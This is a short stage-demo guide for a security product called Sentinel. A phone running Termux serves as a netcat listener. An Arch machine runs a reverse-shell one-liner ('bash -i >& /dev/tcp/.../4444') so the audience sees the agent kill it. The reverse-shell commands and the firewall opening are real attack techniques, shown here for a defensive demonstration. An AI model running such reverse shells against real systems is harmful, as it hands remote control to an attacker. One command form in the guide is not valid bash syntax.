# Phone-as-Attacker Variant (Termux → Arch)

The dramatic option: **your phone plays the attacker's C2**, the Arch machine is the victim. The audience watches a live root shell from the "server" appear on your phone — then watch Sentinel kill it mid-session.

## Setup (5 min, before the pitch)

**On the phone — Termux:**

```bash
pkg update && pkg install nmap-ncat
ip -4 addr | grep inet        # note the phone's Wi-Fi IP, e.g. 192.168.1.42
```

Keep Termux open. Start the listener right before Act 3:

```bash
nc -lvlp 4444
```

**On the Arch machine:**

```bash
# allow the inbound connection (firewall off for the demo room, or open 4444)
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT   # temporary, demo only
```

## The attack (on stage)

On the Arch box — set `PHONE_IP` to the phone's IP:

```bash
bash -i >& 192.168.1.42:4444 2>&1
# if nc syntax differs: bash -i >& /dev/tcp/192.168.1.42/4444 2>&1
```

Your phone now shows a live shell from the "server":

```
[root@arch ~]# whoami
root
```

Hold it for a moment — **let the audience see the compromise is real**. Type `hostname`, maybe `ls /`.

## The kill (5–15 seconds later)

Sentinel's agent flags the lineage (rules 1002 `bash -i`, 1003 `/dev/tcp/`) and kills it. The phone's `nc` connection drops. The shell is dead **mid-keystroke** if you time it right.

Then the punchline — rerun the exact same command:

```bash
bash -i >& 192.168.1.42:4444 2>&1
```

It dies instantly, every time. The lineage block is in the kernel; the family stays dead.

## Notes

- Phone and Arch box must share the Wi-Fi network (same LAN, no client isolation)
- If the venue Wi-Fi has client isolation: bring a travel router or use a USB-C ethernet adapter on the phone + direct cable
- The reverse-shell rule fires `KILL` — the phone listener never receives a prompt if you wait too long before demonstrating; start the listener AFTER you've confirmed the agent is running, and rehearse the timing once
- Cleanup on the Arch box: `sudo iptables -D INPUT -p tcp --dport 4444 -j ACCEPT`
